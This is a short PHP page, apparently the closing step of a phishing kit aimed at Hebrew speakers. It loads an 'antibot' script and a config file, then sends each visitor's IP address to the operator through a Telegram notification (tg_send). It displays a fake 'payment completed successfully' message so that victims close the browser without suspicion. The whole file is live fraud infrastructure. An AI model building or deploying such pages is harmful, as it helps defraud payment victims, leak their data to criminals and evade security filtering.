<?php
include 'antibot.php';
include 'config.php';
tg_send("✅ <b>Redirected to final.php</b>\nIP: {$_SERVER['REMOTE_ADDR']}");
?>
<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>תודה</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f8f9fa; margin: 0; padding: 0; text-align: center; direction: rtl; }
    .message-box { background: white; max-width: 440px; margin: 100px auto; padding: 35px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    h2 { color: #28a745; margin-bottom: 10px; }
    p { color: #333; font-size: 1.05em; }
  </style>
</head>
<body>
  <div class="message-box">
    <h2>התשלום בוצע בהצלחה</h2>
    <p>תודה רבה! תוכל לסגור את הדפדפן כעת.</p>
  </div>
</body>
</html>
